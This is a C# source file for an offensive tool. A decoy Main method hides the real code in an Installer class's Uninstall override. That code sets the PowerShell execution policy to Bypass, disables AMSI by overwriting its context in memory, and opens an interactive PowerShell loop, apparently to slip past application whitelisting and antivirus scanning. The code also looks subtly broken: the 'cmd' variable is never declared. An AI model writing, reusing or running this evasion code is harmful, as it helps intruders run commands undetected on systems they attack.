﻿using System;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // Set Execution Policy
            ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass");

            // Disable AMSI
            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
            ps.Invoke();

            // "Interactive" Shell
            while (true)
            {
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();

                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }


            }

            rs.Close();
        }
    }

}